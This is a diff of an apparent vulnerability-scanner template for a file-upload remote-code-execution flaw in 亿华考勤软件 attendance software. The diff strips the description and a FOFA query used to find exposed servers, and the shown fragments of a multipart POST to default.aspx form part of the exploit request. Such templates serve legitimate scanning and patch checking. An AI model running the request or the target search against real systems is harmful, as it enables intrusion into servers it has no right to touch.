@@ -3,12 +3,8 @@ info:
   name: 亿华考勤软件 default.aspx 存在文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/addbw99995tmlpze'
+  description: ''
   tags: rce,file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: addbw99995tmlpze
-    fofa: body="url:userController.do?userOrgSelect&userId=" && "loginController.do?changeDefaultOrg"
 http:
 - raw:
   - 'POST /filemanage/file/default.aspx HTTP/1.1
@@ -99,17 +95,14 @@ http:
     Content-Disposition: form-data; name="NewFileText"
 
 
-
     ------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
 
     Content-Disposition: form-data; name="NewFolderText"
 
 
-
     ------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37
 
     Content-Disposition: form-data; name="setRootTxt"
-
 
 
     ------geckoformboundary787f61f28ad8b037c0c81d8883ef3b37--'
